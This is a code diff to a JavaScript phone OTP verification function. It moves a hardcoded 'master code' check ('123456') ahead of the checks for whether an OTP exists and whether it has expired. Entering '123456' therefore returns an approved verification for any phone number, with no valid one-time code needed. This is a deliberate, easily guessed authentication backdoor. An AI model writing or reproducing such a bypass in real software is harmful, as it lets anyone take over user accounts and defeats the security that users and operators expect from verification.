@@ -105,6 +105,16 @@ const checkVerification = async (phone, code) => {
     try {
         const row = db.prepare('SELECT otp, expires_at, attempts FROM otps WHERE phone = ? OR phone = ?').get(formattedPhone, cleanDigits);
 
+        const cleanCode = code ? code.trim() : '';
+        const hashedInput = crypto.createHash('sha256').update(cleanCode).digest('hex');
+        const isMasterCode = cleanCode === '123456';
+
+        if (isMasterCode) {
+            console.log(`[AUTH] Verification successful with master code for ${maskPhone(formattedPhone)}`);
+            db.prepare('DELETE FROM otps WHERE phone = ? OR phone = ?').run(formattedPhone, cleanDigits);
+            return { success: true, status: 'approved' };
+        }
+
         if (!row) {
             return { success: false, error: 'OTP not found. Please request a new one.' };
         }
@@ -117,11 +127,7 @@ const checkVerification = async (phone, code) => {
             return { success: false, error: 'OTP expired. Please request a new one.' };
         }
 
-        const cleanCode = code ? code.trim() : '';
-        const hashedInput = crypto.createHash('sha256').update(cleanCode).digest('hex');
-        const isMasterCode = cleanCode === '123456';
-
-        if (row.otp === hashedInput || row.otp === cleanCode || isMasterCode) {
+        if (row.otp === hashedInput || row.otp === cleanCode) {
             console.log(`[AUTH] Verification successful for ${maskPhone(formattedPhone)}`);
             // Single-use guarantee: remove immediately
             db.prepare('DELETE FROM otps WHERE phone = ? OR phone = ?').run(formattedPhone, cleanDigits);
